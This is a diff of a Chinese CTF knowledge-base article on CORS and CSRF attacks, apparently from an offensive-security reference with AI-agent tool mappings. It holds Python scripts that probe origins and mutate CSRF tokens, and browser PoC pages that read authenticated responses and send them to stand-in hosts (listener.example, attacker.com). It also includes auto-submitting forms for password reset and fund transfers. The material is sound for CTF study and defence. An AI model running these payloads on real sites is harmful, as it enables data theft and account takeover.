@@ -3,196 +3,243 @@ id: "ctf-website/07-client/cors-csrf"
 title: "CORS / CSRF 高级攻击"
 title_en: "Advanced CORS / CSRF Attacks"
 summary: >
-  CORS与CSRF高级攻击指南，涵盖CORS四种漏洞利用等级（ACAO反射+ACAC、null origin沙箱iframe、前缀后缀匹配绕过）、CSRF Token八种绕过手法、JSON CSRF跨域请求、SameSite Cookie绕过策略，以及CORS配合CSRF token读取的完整攻击链路。
+  CORS/CSRF 题面的核心是把 Origin、credentials、preflight、ACAO/ACAC、SameSite、CSRF token 与业务副作用放在同一个 oracle 中比较。本篇给出跨域读取判定矩阵、Origin 变体生成器、preflight 探测、CSRF token 单变量突变、SameSite Lax 状态动作、JSON/text/plain CSRF 和 Evidence 模板。
 summary_en: >
-  Advanced CORS and CSRF attack guide covering four CORS exploitation levels (ACAO reflection with ACAC, null origin sandbox iframe, prefix/suffix match bypass), eight CSRF token bypass techniques, JSON CSRF cross-origin requests, SameSite cookie bypass strategies, and complete attack chains combining CORS with CSRF token reading.
+  CORS/CSRF challenges require comparing Origin, credentials, preflight, ACAO/ACAC, SameSite, CSRF tokens, and business side effects in one oracle. Includes cross-origin read matrices, Origin variant generators, preflight probes, CSRF token mutation, SameSite Lax state actions, JSON/text/plain CSRF, and evidence templates.
 board: "ctf-website"
 category: "07-client"
-signals: ["CORS", "CSRF", "SameSite", "跨域请求", "跨站请求伪造", "ACAO", "csrf token bypass"]
-mcp_tools: ["http_probe", "kb_router"]
-keywords: ["CORS配置", "CSRF绕过", "SameSite Cookie", "跨域读取", "CSRF token绕过", "null origin", "JSON CSRF"]
-difficulty: "intermediate"
-tags: ["cors", "csrf", "web-security", "authentication", "ctf"]
+signals: ["CORS", "CSRF", "SameSite", "跨域请求", "跨站请求伪造", "ACAO", "ACAC", "csrf token bypass", "preflight"]
+mcp_tools: ["http_probe", "kb_router", "jshook"]
+keywords: ["CORS", "CSRF", "SameSite Cookie", "跨域读取", "CSRF token绕过", "null origin", "JSON CSRF", "preflight"]
+difficulty: "advanced"
+tags: ["cors", "csrf", "client-side", "authentication", "ctf"]
 language: "zh-CN"
-last_updated: "2026-06-25"
-related_articles: []
+last_updated: "2026-07-04"
+related_articles: ["ctf-website/07-client/admin-bot-xss", "ctf-website/02-auth/jwt/07-theft-replay"]
 ---
 # CORS / CSRF 高级攻击
 
-## 1. CORS 配置速查
+CORS 决定跨域 JS 能不能读响应，CSRF 决定跨站页面能不能借浏览器状态触发动作。实战里两者经常相互接力：CORS 读 token，CSRF 打状态动作；XSS/admin bot 又能把两条线合并。
+
+## 输入信号
+
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| 响应有 `Access-Control-Allow-Origin` | Origin 变体 + credentials oracle | 反射 attacker origin 且 `ACAC=true` | 只允许固定白名单 |
+| 接口接受 Cookie 会话 | 带/不带 credentials 对比 | 跨域读到 `/api/me`、订单、flag | 响应不含认证态 |
+| `Origin: null` 被允许 | sandbox iframe/data/file origin | null origin 读到认证响应 | null 明确拒绝 |
+| CSRF token 在 HTML/API 中 | 先读 token，再单变量突变动作 | token 可复用/跨用户/空值通过 | token 绑定 session+动作 |
+| SameSite=Lax/缺失 | GET 导航和 top-level form | 状态动作被触发 | SameSite/Origin/Token 阻断 |
+| JSON API 无 token | text/plain、form、simple request 绕 preflight | 状态变化或业务响应推进 | preflight 或 content-type 校验 |
+
+## 工作流
+
+```text
+建立同源 baseline
+  → Origin/credentials/preflight 变体扫描
+  → 判断能读响应还是只能触发动作
+  → 抽 CSRF token 与 SameSite 行为
+  → 单变量重放状态动作
+  → 将响应读取、业务副作用和失败样本写入 Evidence
+```
+
+## 0. 判定矩阵
+
+| ACAO | ACAC | Cookie 是否发出 | JS 能否读 | 价值 |
+|---|---|---|---|---|
+| 反射 attacker origin | `true` | 是 | 是 | 可读认证响应 |
+| `*` | 无/false | 否或无关 | 是 | 只能读公开 API |
+| `null` | `true` | 是 | 是 | sandbox/data/file origin 路线 |
+| 固定 trusted origin | `true` | 是 | 否 | 找白名单匹配绕过 |
+| 无 ACAO | 任意 | 是 | 否 | 转 CSRF 状态动作 |
+
+## 1. Origin 与 preflight oracle
 
 ```python
-# CORS 检查一键脚本
+#!/usr/bin/env python3
+import argparse
+import hashlib
+import json
+import requests
+from urllib.parse import urlparse
+
+def host(url):
+    return urlparse(url).netloc
+
+def h(text):
+    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]
+
+def origins(base):
+    hn = host(base)
+    return [
+        "null",
+        f"https://evil.{hn}",
+        f"https://{hn}.attacker.example",
+        f"http://{hn}",
+        f"https://{hn.replace('.', '-')}.attacker.example",
+        "https://attacker.example",
+    ]
+
+def probe(url, origin, method="GET", cookie=""):
+    headers = {"Origin": origin}
+    if cookie:
+        headers["Cookie"] = cookie
+    r = requests.request(method, url, headers=headers, timeout=10)
+    return {
+        "origin": origin,
+        "method": method,
+        "status": r.status_code,
+        "hash": h(r.text),
+        "acao": r.headers.get("Access-Control-Allow-Origin", ""),
+        "acac": r.headers.get("Access-Control-Allow-Credentials", ""),
+        "vary": r.headers.get("Vary", ""),
+        "sample": r.text[:160],
+    }
+
+def preflight(url, origin, req_method="POST", req_headers="content-type,x-csrf-token"):
+    r = requests.options(url, headers={
+        "Origin": origin,
+        "Access-Control-Request-Method": req_method,
+        "Access-Control-Request-Headers": req_headers,
+    }, timeout=10)
+    return {
+        "origin": origin,
+        "status": r.status_code,
+        "acao": r.headers.get("Access-Control-Allow-Origin", ""),
+        "acam": r.headers.get("Access-Control-Allow-Methods", ""),
+        "acah": r.headers.get("Access-Control-Allow-Headers", ""),
+        "acac": r.headers.get("Access-Control-Allow-Credentials", ""),
+    }
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True)
+    ap.add_argument("--cookie", default="")
+    args = ap.parse_args()
+    for o in origins(args.url):
+        print(json.dumps({"simple": probe(args.url, o, cookie=args.cookie), "preflight": preflight(args.url, o)}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
+```
+
+成功样本：attacker origin 被反射，`ACAC=true`，带 cookie 的响应 hash 与同源 baseline 一致或包含用户字段。失败样本：只有公开字段、无 ACAC、preflight 不允许目标 method/header。
+
+## 2. 浏览器 PoC 模板
+
+```html
+<!doctype html>
+<script>
+async function run() {
+  const target = "https://target.example/api/me";
+  const r = await fetch(target, {credentials: "include"});
+  const t = await r.text();
+  navigator.sendBeacon("https://listener.example/cors", JSON.stringify({
+    status: r.status,
+    type: r.type,
+    body: t.slice(0, 2000)
+  }));
+}
+run().catch(e => navigator.sendBeacon("https://listener.example/cors-err", String(e)));
+</script>
+```
+
+如果浏览器 console 显示 CORS error，但服务端状态已经变化，这不是 CORS 读取，而是 CSRF 状态动作路线。
+
+## 3. CSRF token 变体
+
+| 变体 | 操作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| remove | 删除 token 字段/header | 动作成功 | `csrf missing` |
+| empty | token 置空/`null` | 动作成功 | `csrf invalid` |
+| reuse | 同一 token 重放多次 | 多次成功 | 一次后失效 |
+| cross-user | A token 给 B session | B 动作成功 | session mismatch |
+| cross-action | profile token 打 transfer | 动作成功 | action mismatch |
+| method flip | POST 改 GET/PUT/override | 状态变化 | method 拒绝 |
+| content-type flip | JSON 改 text/plain/form | 状态变化 | strict content-type |
+
+```python
+#!/usr/bin/env python3
+import argparse
+import copy
+import hashlib
+import json
 import requests
 
-def check_cors(target: str, endpoint: str = "/api/me"):
-    """检查 CORS 配置"""
-    tests = {
-        "null_origin": "null",
-        "evil_subdomain": f"https://evil.{target.split('//')[1].split('/')[0]}",
-        "evil_prefixed": f"https://{target.split('//')[1].split('/')[0]}.evil.com",
-        "evil_suffix": f"https://evil.com/{target.split('//')[1].split('/')[0]}",
-        "no_origin": None,
-        "http_variant": target.replace("https://", "http://"),
-    }
-    for name, origin in tests.items():
-        headers = {}
-        if origin:
-            headers["Origin"] = origin
-        r = requests.get(target + endpoint, headers=headers)
-        acao = r.headers.get("Access-Control-Allow-Origin", "")
-        acac = r.headers.get("Access-Control-Allow-Credentials", "")
-        print(f"  {name:20s} → ACAO: {acao:40s} | ACAC: {acac}")
+def h(text):
+    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]
+
+def variants(body, token_name):
+    yield "baseline", body
+    b = copy.deepcopy(body); b.pop(token_name, None); yield "remove_token", b
+    for v in ("", None, "0", "undefined"):
+        b = copy.deepcopy(body); b[token_name] = v; yield f"token={v}", b
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True)
+    ap.add_argument("--cookie", default="")
+    ap.add_argument("--body", required=True, help="JSON body")
+    ap.add_argument("--token-name", default="csrf_token")
+    args = ap.parse_args()
+    sess = requests.Session()
+    if args.cookie:
+        sess.headers["Cookie"] = args.cookie
+    base = json.loads(args.body)
+    for name, b in variants(base, args.token_name):
+        r = sess.post(args.url, json=b, timeout=10)
+        print(json.dumps({"case": name, "status": r.status_code, "hash": h(r.text), "sample": r.text[:180]}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
 ```
 
-## 2. CORS 漏洞利用等级
-
-```
-# Level 1: ACAO 反射且 ACAC=true
-# Access-Control-Allow-Origin: https://evil.com
-# Access-Control-Allow-Credentials: true
-# → 可跨域读取认证请求的响应 → 完全读取
-
-# Level 2: ACAO 反射但无 ACAC
-# Access-Control-Allow-Origin: *
-# → 只能读无需 cookie 的公开 API
-
-# Level 3: ACAO null
-# Access-Control-Allow-Origin: null
-# → null origin 可被 iframe sandbox 触发
-
-# Level 4: 前缀/后缀匹配绕过
-# 白名单 *.target.com → evil.target.com 不可用
-# 但 target.com.evil.com 可能通过
-```
-
-### Level 1 Exploit
+## 4. SameSite 与 simple request
 
 ```html
-<!-- 托管在 attacker.com -->
-<script>
-fetch('https://target.com/api/user/profile', {
-    credentials: 'include'  // 带 cookie
-})
-.then(r => r.json())
-.then(data => fetch('https://attacker.com/log?d=' + btoa(JSON.stringify(data))));
-</script>
-```
+<!-- SameSite=Lax: top-level GET/navigation 常带 cookie，适合找 GET 状态动作 -->
+<a id=x href="https://target.example/api/delete?id=123">go</a>
+<script>x.click()</script>
 
-### Level 3 Exploit (null origin)
-
-```html
-<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
-  srcdoc="<script>
-    fetch('https://target.com/api/me', {credentials:'include'})
-      .then(r => r.text())
-      .then(d => parent.postMessage(d, '*'));
-  </script>">
-</iframe>
-<!-- null origin 因为 sandbox 属性 -->
-```
-
-## 3. CSRF 高级
-
-### Token 绕过
-
-```python
-# CSRF 绕过排查清单:
-CSRF_BYPASS_CHECKS = [
-    # 1. Token 不验证 → 直接删参数
-    "remove_csrf_param",
-    # 2. Token 绑定 session 但可复用
-    "reuse_token",
-    # 3. Token 被其他用户的 token 替代仍通过
-    "cross_user_token",
-    # 4. 空值绕过
-    {"csrf_token": ""}, {"csrf": None},
-    # 5. 修改 Content-Type
-    "Content-Type: application/json", "Content-Type: text/plain",
-    # 6. 修改 HTTP method → GET
-    "GET_override",
-    # 7. 自定义 header → 可能仅检查存在性
-    "X-Requested-With: XMLHttpRequest",  # 仅检查存在即放行
-    # 8. Token 在 cookie 中 → CSRF 自动带
-    "cookie_only_csrf",
-]
-```
-
-### CSRF → 密码重置劫持
-
-```python
-# 如果密码重置接口无 CSRF 保护且使用 cookie 会话:
-# 攻击者诱导受害者点击恶意页面:
-# → 自动 POST 修改密码为攻击者控制的密码
-
-# PoC HTML:
-csrf_html = '''
-<form action="https://target.com/reset-password" method="POST" id="f">
-  <input name="password" value="Attacker123!">
-  <input name="confirm" value="Attacker123!">
+<!-- text/plain 避免预检；后端若宽松解析 JSON-like body，可触发动作 -->
+<form method="POST" action="https://target.example/api/transfer" enctype="text/plain">
+  <textarea name='{"to":"attacker","amount":1000,"x":"'>x"}</textarea>
+  <button>go</button>
 </form>
-<script>document.getElementById('f').submit();</script>
-'''
+<script>document.forms[0].submit()</script>
 ```
 
-### JSON CSRF
+判定：SameSite 路线看的是状态变化，不要求 JS 能读响应；CORS 路线看的是响应可读。两者不要混在同一个结论里。
 
-```html
-<!-- 如果后端接受 JSON Content-Type 且无 CSRF 保护 -->
-<script>
-fetch('https://target.com/api/transfer', {
-    method: 'POST',
-    credentials: 'include',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({to: 'attacker', amount: 999999})
-});
-</script>
-<!-- 可能被 CORS preflight 阻挡，但如果配置宽松则可绕过 -->
-```
+## 攻击链
 
-## 4. SameSite Cookie 绕过
+```text
+CORS 反射 + ACAC
+  → 跨域读 /api/me 或 CSRF token
+  → 带 token 打状态动作
+  → 外带业务响应或 flag
 
-```
-SameSite=Lax:   GET 导航会发 cookie，POST 不发的 → 找 GET 可触发的状态变更
-SameSite=None:  无保护，但必须 Secure=true (HTTPS)
-SameSite=Strict: 最严格，同站才发
-
-SameSite Lax 绕过:
-  - GET /api/deleteUser?id=1 → 状态变更在 GET 上
-  - <a href="..."> 点击 → 会带 cookie
-  - window.open + location 也会带 cookie
-```
-
-## 5. 攻击链
-
-```
-CORS misconfig → 跨域读用户数据 → API token/PII 泄露
-CORS null origin → iframe 窃取 → Account Takeover
-CSRF password reset → 无 token 保护 → 改密码 → 接管
-SameSite Lax + GET state change → CSRF → 删号/转账
-CSRF + XSS → 持久化后门 → 长期控制
-CORS → CSRF token 读取 → 完整 CSRF 攻击链路
-```
-
-## 工具引用
-
-```bash
-# 通用 HTTP 探测框架；带认证的请求应保存在被 gitignore 的 case/exports 中
-python scripts/ctf-website/http_probe.py https://example.test/
-
-## MCP 工具映射
-
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| CORS/CSRF 探测 | `http_probe` | HTTP GET 探测 CORS 头和 CSRF 漏洞 |
-| 知识检索 | `kb_router` | 按 CORS/CSRF 信号搜索知识库 |
+CSRF simple request
+  → 借浏览器 cookie 触发状态动作
+  → 用状态查询/回调/邮件/订单页确认副作用
 ```
 
 ## Evidence
 
-- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
-- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
-- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
-- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
+| 项 | 记录内容 |
+|---|---|
+| CORS baseline | URL、Origin、ACAO、ACAC、Vary、preflight 结果 |
+| 凭据行为 | Cookie 是否随请求、JS 是否能读 body、响应 hash |
+| CSRF 变体 | token 删除/空值/复用/跨用户/跨动作/method/content-type |
+| SameSite | cookie 属性、导航方式、method、状态动作结果 |
+| 成功样本 | 跨域读到认证数据/token/flag，或跨站动作产生可复查副作用 |
+| 失败样本 | CORS error 且无副作用、token mismatch、preflight 拒绝、SameSite 不带 cookie |
+| 下一跳 | 读到 JWT 转 `02-auth/jwt`；读到前端状态转 `admin-bot-xss`；业务动作转支付/IDOR |
+
+## MCP 工具映射
+
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| CORS 头探测 | `http_probe` | 固定 Origin/credentials/preflight 变体 |
+| 浏览器 PoC | `jshook` | 验证 JS 是否能读 body、是否有副作用 |
+| 知识路由 | `kb_router` | 按 CORS、CSRF、SameSite、preflight 信号搜索 |
